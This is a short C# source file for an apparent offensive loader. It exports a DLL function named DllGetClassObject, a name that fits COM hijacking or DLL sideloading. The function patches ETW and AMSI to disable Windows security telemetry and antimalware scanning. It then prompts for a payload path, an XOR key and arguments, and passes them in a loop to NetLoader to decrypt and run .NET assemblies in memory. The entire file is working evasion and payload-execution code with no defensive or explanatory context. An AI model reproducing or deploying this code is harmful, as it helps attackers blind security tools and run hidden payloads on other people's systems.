using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Runtime.InteropServices;

namespace happyjai
{
    internal class happyjai
    {
        [DllExport]
        public static void DllGetClassObject()
        {
            NetLoader.PatchETW();
            NetLoader.PatchAMSI();
            Console.Write("==>Path: ");
            string str1 = Console.ReadLine();
            Console.Write("==>key: ");
            string str2 = Console.ReadLine();
            while (true)
            {
                Console.Write("==>args: ");
                string[] second = Console.ReadLine().Split(' ');
                if (!(second[0] == "exit"))
                    NetLoader.Main(((IEnumerable<string>)new string[5]
                    {
            "-path",
            str1,
            "-xor",
            str2,
            "-args"
                    }).Concat<string>((IEnumerable<string>)second).ToArray<string>());
                else
                    return;
            }
        }
    }


}
